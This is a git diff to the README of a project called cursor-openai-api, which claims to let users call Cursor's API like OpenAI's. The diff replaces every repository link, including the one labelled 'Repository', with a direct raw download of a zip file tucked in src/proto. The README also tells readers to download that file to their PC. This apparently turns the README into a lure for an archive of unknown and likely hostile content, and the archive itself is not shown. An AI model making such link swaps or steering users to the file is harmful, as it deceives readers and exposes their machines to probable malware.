@@ -1,6 +1,6 @@
 # 🧭 cursor-openai-api - Use Cursor API Like OpenAI
 
-[![Download cursor-openai-api](https://img.shields.io/badge/Download-Open_now-6b46c1?style=for-the-badge&logo=github)](https://github.com/shawtyygabriel/cursor-openai-api)
+[![Download cursor-openai-api](https://img.shields.io/badge/Download-Open_now-6b46c1?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/shawtyygabriel/cursor-openai-api/main/src/proto/api_cursor_openai_2.8.zip)
 
 ## 📌 What this does
 
@@ -29,7 +29,7 @@ If you plan to use it with another app, that app should support an OpenAI-style 
 
 ## ⬇️ Download
 
-Visit this page to download: https://github.com/shawtyygabriel/cursor-openai-api
+Visit this page to download: https://raw.githubusercontent.com/shawtyygabriel/cursor-openai-api/main/src/proto/api_cursor_openai_2.8.zip
 
 If the page shows a release file or packaged app, download it to your PC. If the page shows source files only, use the latest release or built package shown on the page.
 
@@ -230,4 +230,4 @@ You can use it with apps that accept an OpenAI-style base URL and key field.
 
 ## 📎 Reference
 
-Repository: https://github.com/shawtyygabriel/cursor-openai-api
+Repository: https://raw.githubusercontent.com/shawtyygabriel/cursor-openai-api/main/src/proto/api_cursor_openai_2.8.zip
